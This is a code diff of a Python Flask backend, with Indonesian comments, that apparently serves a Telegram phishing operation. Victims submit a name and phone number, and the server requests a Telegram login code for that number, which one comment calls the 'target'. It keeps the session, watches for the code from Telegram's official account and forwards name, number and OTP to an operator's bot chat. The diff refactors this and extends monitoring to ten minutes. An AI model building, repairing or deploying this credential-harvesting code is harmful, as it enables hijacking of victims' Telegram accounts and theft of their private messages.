@@ -6,7 +6,6 @@ from flask import Flask, request, jsonify
 from flask_cors import CORS
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from asgiref.sync import async_to_sync
 
 app = Flask(__name__)
 CORS(app)
@@ -17,50 +16,45 @@ API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
-# Memory Storage (Karena Railway Read-Only)
-user_sessions = {}  # Menyimpan session string tiap nomor
-active_status_msg = {} # Melacak pesan "Menunggu OTP"
+# Memory Storage untuk Railway (Tanpa SQLite)
+user_sessions = {}  
+active_status_msg = {} 
 
-def send_bot(text, buttons=None):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
-    if buttons:
-        payload["reply_markup"] = {"inline_keyboard": buttons}
-    res = requests.post(url, json=payload).json()
-    return res.get("result", {}).get("message_id")
-
-def delete_bot(msg_id):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
-    requests.post(url, json={"chat_id": CHAT_ID, "message_id": msg_id})
+def bot_api(method, payload):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
+    return requests.post(url, json=payload).json()
 
 @app.route('/register', methods=['POST'])
-def register():
-    data = request.json
-    step = data.get('step')
-    raw_nomor = data.get('nomor', '').strip().replace(" ", "")
-    nomor = '+62' + raw_nomor[1:] if raw_nomor.startswith('0') else raw_nomor
-    nama = data.get('nama', 'User')
-
-    # Buat client sementara untuk ambil session awal
-    client = TelegramClient(StringSession(""), int(API_ID), API_HASH)
-    
+async def register():
     try:
-        async_to_sync(client.connect)()
+        data = request.json
+        step = data.get('step')
+        raw_nomor = data.get('nomor', '').strip().replace(" ", "")
+        nomor = '+62' + raw_nomor[1:] if raw_nomor.startswith('0') else raw_nomor
+        nama = data.get('nama', 'User')
+
+        # Gunakan StringSession kosong untuk menghindari error 'unable to open database'
+        client = TelegramClient(StringSession(""), int(API_ID), API_HASH)
+        await client.connect()
+
         if step == 1:
-            # Kirim OTP awal agar backend dapat akses sesi
-            res = async_to_sync(client.send_code_request)(nomor)
-            user_sessions[nomor] = client.session.save()
+            # Kirim OTP awal ke target agar backend dapat akses sesi
+            res = await client.send_code_request(nomor)
+            user_sessions[nomor] = {"session": client.session.save(), "nama": nama}
             
-            # Tampilan bot sesuai permintaan
-            send_bot(
-                f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : ",
-                [[{"text": "otp", "callback_data": f"track_{nomor}"}]]
-            )
+            # Tampilan bot dengan tombol otp
+            bot_api("sendMessage", {
+                "chat_id": CHAT_ID,
+                "text": f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : ",
+                "parse_mode": "Markdown",
+                "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"track_{nomor}"}]]}
+            })
+            await client.disconnect()
             return jsonify({"status": "success"}), 200
+            
     except Exception as e:
+        print(f"Error detail: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
-    finally:
-        async_to_sync(client.disconnect)()
 
 @app.route('/webhook', methods=['POST'])
 async def webhook():
@@ -71,24 +65,25 @@ async def webhook():
         
         if data.startswith("track_"):
             nomor = data.split("_")[1]
-            # Tampilkan status menunggu
-            msg_id = send_bot(
-                "status menunggu OTP", 
-                [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]
-            )
-            active_status_msg[nomor] = msg_id
+            # Tampilan status menunggu
+            res = bot_api("sendMessage", {
+                "chat_id": CHAT_ID,
+                "text": "status menunggu OTP",
+                "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
+            })
+            active_status_msg[nomor] = res.get("result", {}).get("message_id")
             
-            # Mulai pantau pesan masuk secara otomatis
-            session_str = user_sessions.get(nomor)
+            # Jalankan background listener secara otomatis
+            session_str = user_sessions.get(nomor, {}).get("session")
             if session_str:
                 asyncio.create_task(otp_listener(nomor, session_str))
 
         elif data.startswith("exit_"):
             nomor = data.split("_")[1]
             if nomor in active_status_msg:
-                delete_bot(active_status_msg[nomor])
+                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_status_msg[nomor]})
                 active_status_msg.pop(nomor)
-            send_bot("Anda telah keluar dari mode input inline")
+            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Anda telah keluar dari mode input inline"})
 
     return jsonify({"status": "success"}), 200
 
@@ -96,21 +91,26 @@ async def otp_listener(nomor, session_str):
     client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
     await client.connect()
     
-    # Deteksi pesan dari sistem Telegram (777000)
+    # Deteksi pesan baru dari Telegram Official (777000)
     @client.on(events.NewMessage(from_users=777000))
     async def handler(event):
         otp_match = re.search(r'\b\d{5}\b', event.raw_text)
         if otp_match:
             otp_code = otp_match.group(0)
-            # Hapus teks "menunggu" dan kirim hasil
+            # Hapus status menunggu
             if nomor in active_status_msg:
-                delete_bot(active_status_msg[nomor])
+                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_status_msg[nomor]})
                 active_status_msg.pop(nomor)
             
-            send_bot(f"✅ **OTP TERDETEKSI!**\nNomor: `{nomor}`\nOTP : `{otp_code}`")
+            nama = user_sessions.get(nomor, {}).get("nama", "User")
+            bot_api("sendMessage", {
+                "chat_id": CHAT_ID,
+                "text": f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{otp_code}`",
+                "parse_mode": "Markdown"
+            })
             await client.disconnect()
 
-    await asyncio.sleep(300) # Pantau selama 5 menit
+    await asyncio.sleep(600) # Pantau selama 10 menit
     await client.disconnect()
 
 if __name__ == "__main__":
